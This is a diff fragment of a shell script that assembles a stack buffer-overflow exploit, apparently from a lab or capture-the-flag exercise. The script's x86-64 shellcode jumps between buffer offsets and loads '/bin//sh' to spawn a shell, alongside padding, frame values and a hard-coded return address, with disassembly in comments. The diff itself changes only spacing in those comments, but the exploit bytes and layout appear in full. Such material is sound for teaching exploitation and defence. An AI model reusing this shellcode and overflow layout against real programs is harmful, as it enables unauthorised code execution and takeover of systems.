@@ -32,9 +32,9 @@ Instruction
 # 4 ~ 16th bytes
 shellcode_part1="\x48\x31\xf6\x56\x48\x8d\x85\x60\xff\xff\xff\xff\xe0"
 : << Instruction
-48 31 f6                xor    rsi,rsi
+48 31 f6                xor    rsi, rsi
 56                      push   rsi
-48 8d 85 60 ff ff ff    lea    rax,[rbp-0xa0]
+48 8d 85 60 ff ff ff    lea    rax, [rbp-0xa0]
 ff e0                   jmp    rax  # jump to buf[64]
 Instruction
 
@@ -44,9 +44,9 @@ fill2=$(printf "\x01%.0s" $(seq 17 19))$frame$frame"\x0c\x87\x63\x01"
 # 64 ~ 79th bytes
 shellcode_part2="\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x8d\x45\xa0\xff\xe0"
 : << Instruction
-48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f2f6e69622f  # encoded from "/bin//sh"
+48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f  # encoded from "/bin//sh"
 2f 73 68
-48 8d 45 a0             lea    rax,[rbp-0x60]
+48 8d 45 a0             lea    rax, [rbp-0x60]
 ff e0                   jmp    rax  # jump to buf[128]
 Instruction
 
